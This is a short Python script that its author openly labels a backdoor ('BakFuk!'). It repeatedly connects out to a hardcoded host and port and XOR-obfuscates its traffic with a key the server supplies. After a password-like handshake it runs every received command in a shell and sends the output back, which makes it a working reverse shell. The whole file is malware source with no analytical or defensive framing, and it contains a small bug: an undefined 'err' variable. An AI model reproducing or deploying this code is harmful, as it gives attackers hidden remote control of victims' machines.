#!/usr/bin/python
# BakFuk!
# Simple python backdoor 
# Made by Ragnax

import sys
import os
import subprocess
import socket
import time
import random
import binascii

delay = 1
host = '127.0.0.1'
port = 31337

def xor_data(xor, data):
    while len(xor) < len(data):
        xor+=xor
    return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xor, data))

def unxor_data(xor, data):
    while len(xor) < len(data):
        xor+=xor
    return "".join(chr(ord(y) ^ ord(x)) for x, y in zip(xor, data))

while True:
    time.sleep(delay)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        d=s.recv(8)
        if not d:
            s.close()
            break
        try:
            xor_key = d
        except:
            s.close()
            continue
        s.send(xor_data(xor_key, "fuk?"))
        d=s.recv(1024)
        d=unxor_data(xor_key, d)
        if d != 'fuk!':
            #TODO: remove binary.
            sys.exit(-1)
    except:
        continue
    while True:
        try:
            data=s.recv(2048)
            data = unxor_data(xor_key, data)
            if not data:
                s.close()
                xor_key=""
                break
            data = data.split()
            if len(data):
                if data[0] == "exit":
                    s.close()
                    xor_key=""
                    break
                else:
                    p=subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                    out = p.stdout.read() + p.stderr.read()
                    if out != '' or err != '':
                        s.send(xor_data(xor_key, str(out) + '\r\n'))
        except:
            s.close()
            xor_key=""
            break
